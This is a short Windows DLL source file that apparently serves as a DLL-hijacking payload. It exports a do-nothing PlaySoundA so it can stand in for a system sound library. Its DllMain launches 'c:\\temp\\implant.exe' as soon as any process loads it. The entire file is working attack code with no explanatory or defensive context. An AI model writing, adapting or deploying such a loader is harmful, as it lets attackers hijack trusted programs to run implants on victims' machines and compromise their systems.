#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
        CreateProcess(
					"c:\\temp\\implant.exe",
					"", NULL, NULL, TRUE, 0, NULL, NULL, 
					&info, &processInfo);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
	 __declspec(dllexport) BOOL WINAPI PlaySoundA(
											LPCSTR pszSound,
											HMODULE hmod,
											DWORD fdwSound) {
		 return TRUE;
		}
}
